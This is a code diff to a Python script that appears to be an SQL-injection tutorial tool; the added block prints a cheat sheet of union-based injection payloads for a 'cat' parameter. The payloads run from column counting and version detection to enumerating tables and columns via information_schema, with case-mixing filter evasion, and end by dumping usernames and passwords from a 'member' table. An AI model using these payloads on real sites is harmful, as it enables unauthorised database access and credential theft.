@@ -29,7 +29,7 @@ except ImportError as e:
 
 
 clear = lambda: os.system('clear')
-note="""
+note=Y+"""
 -|----------------------------------------------------------------------------|-
  |: Using Apostrophe [']
  |: Using Quotation mark [?]
@@ -74,6 +74,35 @@ check_version="""
 ----------------------------------------------------------------------------
 """
 print(check_version)
+
+
+note2=B+"""
+cat=.4 order by 10 -- -
+----------------------------------------------------------------------------
+cat=.4 union select version(),2-- -
+----------------------------------------------------------------------------
+cat=.4 union select table_name,2 froM+InfORmaTion_scHema.tAblES -- -
+----------------------------------------------------------------------------
+cat=.4 union select table_name,2+froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+----------------------------------------------------------------------------
+cat=.4 union select group_concat(table_name),2+froM+InfORmaTion_scHema.tAblES WhERe TaBle_ScHEmA=schEMA()-- -
+----------------------------------------------------------------------------
+http://www.waraxe.us/sql-char-encoder.html
+----------------------------------------------------------------------------
+cat=.4 union select group_concat(column_name),2+froM+InfORmaTion_scHema.cOlumnS WheRe+tAblE_naMe=0x6d656d626572 -- -
+----------------------------------------------------------------------------
+cat=.4 union select group_concat(username,0x3a,password),2 from member -- -
+----------------------------------------------------------------------------
+"""
+
+
+
+clear()
+print(note2)
+
+
+input("[Pres Enter]")
+clear()
 
 
 level1="""
